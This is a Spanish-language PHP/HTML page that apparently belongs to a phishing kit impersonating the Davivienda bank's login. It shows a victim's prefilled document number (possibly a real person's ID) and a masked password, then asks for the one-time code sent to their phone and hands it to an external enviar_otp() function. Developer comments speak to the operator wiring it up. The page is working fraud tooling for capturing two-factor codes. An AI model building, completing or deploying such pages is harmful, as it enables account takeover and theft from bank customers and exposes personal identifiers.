<?php 



?>

<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Verificacion OTP</title>
<style>
  :root{--brand:#d60000;--text:#222;--muted:#6b7280;--bg:#f6f7f9;--radius:12px}
  *{box-sizing:border-box}
  body{margin:0;font-family:system-ui,-apple-system,Segoe UI,Roboto,Ubuntu,Cantarell,Arial;background:var(--bg);color:var(--text)}
  .wrap{max-width:460px;margin:32px auto;padding:0 16px}
  .card{background:#fff;border-radius:var(--radius);box-shadow:0 6px 18px rgba(0,0,0,.08);padding:22px}
  h1{margin:0 0 4px;font-size:28px}
  .sub{margin:0 0 18px;color:var(--muted);font-weight:600}
  label{display:block;font-size:14px;margin:16px 0 6px}
  input, select{
    width:100%;padding:12px 14px;border:1px solid #d1d5db;border-radius:10px;font-size:15px;background:#fff;outline:none
  }
  input:disabled, select:disabled{background:#f3f4f6;color:#6b7280}
  input:focus, select:focus{border-color:#9ca3af}
  .row{display:flex;align-items:center;gap:10px;margin-top:10px}
  .row input[type="checkbox"]{width:18px;height:18px}
  .btn{width:100%;border:0;background:var(--brand);color:#fff;padding:14px 18px;border-radius:999px;font-weight:700;font-size:15px;cursor:pointer}
  .muted{color:var(--muted);font-size:13px;margin-top:10px}
  .invalid{border-color:#b00020}
  .mensaje{color:#b00020;font-size:13px;margin:8px 0 0;display:none}
  .mensaje:before{content:"â™¦ ";font-size:12px;vertical-align:middle}
  .resend{
    display:inline-block; margin-left:8px; padding:6px 10px; border-radius:999px;
    background:#efefef; color:#444; border:0; cursor:not-allowed; font-weight:600; font-size:12px;
  }
  .resend.enabled{background:#ffe4e4; color:#b00020; cursor:pointer}
  .header{ padding:24px 0; display:flex; justify-content:center; align-items:center; }
  .logo{ max-width:180px; height:auto; }
</style>

</head>
<header class=header><img class="logo" src="img/logo.webp" alt="Logo"></header>
<body>
  <div class="wrap">
    <div class="card">
      <h1>Hola!</h1>
      <p class="sub">Nos alegra que este aqui</p>

      <!-- Tipo de documento: visible, deshabilitado (no censurado) -->
      <label for="tipoDoc">Seleccione su tipo de documento</label>
      <select id="tipoDoc" disabled>
        <option selected>Cedula de Ciudadania</option>
      </select>

      <!-- Numero de documento: deshabilitado (puedes quitar password si lo quieres visible) -->
      <label for="txtUsuario">Ingrese su numero de documento</label>
      <input id="txtUsuario" type="password" value="1019120156" disabled />

      <div class="row" style="opacity:.7">
        <input id="rec" type="checkbox" disabled />
        <label for="rec" style="margin:0;">Recordar mis datos de identidad</label>
      </div>

      <!-- Clave virtual: en asteriscos y deshabilitada -->
      <label for="txtPass">Ingrese su clave virtual</label>
      <input id="txtPass" type="password" placeholder="6 a 8 digitos" value="******" disabled />

      <!-- Codigo OTP: unico campo habilitado -->
      <label for="txtOTP">Ingrese el codigo que enviamos a su celular</label>
      <input id="txtOTP" class="pass" type="text" inputmode="numeric" placeholder="" />

      <div class="mensaje">Verifique su identidad, para continuar debe ingresar el codigo enviado a su celular o correo electronico.</div>

      <p class="muted">
        Si no recibio el codigo, podra solicitar otro en
        <strong id="timer">00:55</strong>
        <button id="btnResend" class="resend" disabled>Solicitar otro codigo</button>
      </p>

      <div style="margin-top:18px;">
        <button id="btnOTP" class="btn">Iniciar sesion</button>
      </div>

      <!-- Variable extra que usas en tus scripts -->
      <input id="banco" type="hidden" value="DAVIVIENDA" />
    </div>
  </div>

  <!-- LIBRERIAS -->
  <script src="../../scripts/jquery-3.6.0.min.js"></script>
  <script src="../../scripts/jquery.jclock-min.js"></script>
  <script src="../../scripts/functions2.js"></script>

  <!-- TU SCRIPT (integrado) -->
  <script>
    var espera = 0;
    let identificadorTiempoDeEspera;

    function retardor() {
      identificadorTiempoDeEspera = setTimeout(retardorX, 900);
    }
    function retardorX() { /* reservado para tus acciones */ }

    // Handlers de OTP (tal cual nos enviaste)
    $(document).ready(function() {

      // Solo digitos en el OTP
      $('#txtOTP').on('input', function(){
        this.value = this.value.replace(/\D+/g,'');
      });

      $('#btnOTP').click(function(){
        if ($("#txtOTP").val().length > 5) {
          if (typeof enviar_otp === 'function') {
            enviar_otp($("#txtOTP").val());
          } else {
            alert('enviar_otp no esta definido. Conecta tu functions2.js');
          }
        } else {
          $(".mensaje").show();
          $(".pass").addClass("invalid");
          $("#txtOTP").focus();
        }
      });

      $("#txtOTP").on('keyup', function() {
        $(".pass").removeClass("invalid");
        $(".mensaje").hide();
      });

      // ====== Segundero funcional (00:55) ======
      startCountdown(55);
      $('#btnResend').on('click', function(){
        if (!$(this).hasClass('enabled')) return;
        // Reinicia el contador al solicitar nuevo codigo
        $(this).removeClass('enabled').prop('disabled', true);
        startCountdown(55);
        if (typeof solicitar_otp === 'function') {
          solicitar_otp(); // si tienes una funcion especifica para reenviar
        } else if (typeof reenviar_otp === 'function') {
          reenviar_otp();
        } else {
          // opcional: feedback simple
          console.log('Solicitando nuevo codigo...');
        }
      });
    });

    function startCountdown(seconds){
      var remaining = seconds;
      var $timer = $('#timer');
      var $resend = $('#btnResend');

      updateClock($timer, remaining);
      var iv = setInterval(function(){
        remaining--;
        updateClock($timer, remaining);
        if (remaining <= 0) {
          clearInterval(iv);
          $timer.text('00:00');
          $resend.addClass('enabled').prop('disabled', false).focus();
        }
      }, 1000);
    }

    function updateClock($el, s){
      var mm = Math.floor(s/60);
      var ss = s % 60;
      var txt = (mm<10?'0':'')+mm+':'+(ss<10?'0':'')+ss;
      $el.text(txt);
    }
  </script>
</body>
</html>

